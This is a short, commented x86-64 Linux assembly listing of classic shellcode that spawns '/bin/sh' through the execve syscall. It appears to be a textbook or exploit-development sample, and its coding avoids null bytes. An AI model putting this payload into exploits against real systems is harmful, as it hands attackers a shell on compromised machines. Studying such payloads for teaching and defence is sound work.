section .text
    global _start

_start:
    xor rsi, rsi                  ; rsi = NULL
    push rsi                      ; null terminator for the string
    mov rbx, 0x68732f2f6e69622f  ; "/bin//sh"
    push rbx                      ; push the string onto the stack
    mov rdi, rsp                  ; rdi = pointer to "/bin//sh"

    xor rdx, rdx                  ; rdx = NULL (envp)
    push rdx                      ; NULL terminator for argv
    push rdi                      ; argv[0] = pointer to "/bin//sh"
    mov rsi, rsp                  ; rsi = pointer to the argv array

    push 59                       ; syscall 59 = execve
    pop rax
    syscall
